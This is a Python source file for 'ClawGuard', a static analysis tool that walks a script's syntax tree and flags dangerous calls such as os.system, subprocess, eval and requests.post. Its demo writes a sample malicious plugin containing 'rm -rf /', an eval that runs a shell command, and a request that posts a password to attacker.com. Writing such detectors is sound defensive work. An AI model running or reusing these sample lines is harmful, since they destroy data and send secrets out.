import ast
import os


class ClawGuardScanner(ast.NodeVisitor):
    """ClawGuard 核心静态审计引擎 - 基于 AST 抽象语法树"""

    def __init__(self, file_path):
        self.file_path = file_path
        self.issues = []
        # 定义高危函数黑名单
        self.blacklist = {
            'os': ['system', 'popen', 'spawn'],
            'subprocess': ['run', 'Popen', 'call'],
            'builtins': ['eval', 'exec', 'compile'],
            'requests': ['post', 'put', 'delete']  # 监控潜在的数据外发
        }

    def check_risky_call(self, node):
        """检测函数调用是否在黑名单中"""
        func_name = ""
        # 处理直接调用如 eval()
        if isinstance(node.func, ast.Name):
            func_name = node.func.id
            for module in self.blacklist:
                if func_name in self.blacklist[module]:
                    self.report_issue(node, func_name, "高危函数调用")

        # 处理模块调用如 os.system()
        elif isinstance(node.func, ast.Attribute):
            if hasattr(node.func.value, 'id'):
                module_name = node.func.value.id
                method_name = node.func.attr
                if module_name in self.blacklist and method_name in self.blacklist[module_name]:
                    self.report_issue(node, f"{module_name}.{method_name}", "敏感系统操作")

    def report_issue(self, node, name, category):
        """记录发现的安全隐患"""
        self.issues.append({
            'line': node.lineno,
            'name': name,
            'category': category,
            'level': 'HIGH 🔴'
        })

    def visit_Call(self, node):
        """遍历所有的函数调用节点"""
        self.check_risky_call(node)
        self.generic_visit(node)

    def run_audit(self):
        """开始审计"""
        print(f"🛡️  ClawGuard 正在审计: {self.file_path}")
        try:
            with open(self.file_path, "r", encoding="utf-8") as f:
                tree = ast.parse(f.read())
            self.visit(tree)

            if not self.issues:
                print("✅ 审计完成：未发现明显安全风险。")
            else:
                print(f"⚠️  警告：发现 {len(self.issues)} 处潜在安全隐患！")
                for issue in self.issues:
                    print(f"  [第 {issue['line']} 行] {issue['category']}: {issue['name']} ({issue['level']})")
        except Exception as e:
            print(f"❌ 审计出错: {e}")


# 测试运行
if __name__ == "__main__":
    # 这里可以填入你要扫描的插件文件名
    target_file = "test_plugin.py"

    # 如果没有测试文件，我们顺便建一个包含“恶意代码”的文件来演示
    if not os.path.exists(target_file):
        with open(target_file, "w") as f:
            f.write(
                "import os\nimport requests\n\nos.system('rm -rf /')\neval('__import__(\"os\").system(\"ls\")')\nrequests.post('http://attacker.com/steal', data={'pwd': '123'})\nprint('Hello World')")

    scanner = ClawGuardScanner(target_file)
    scanner.run_audit()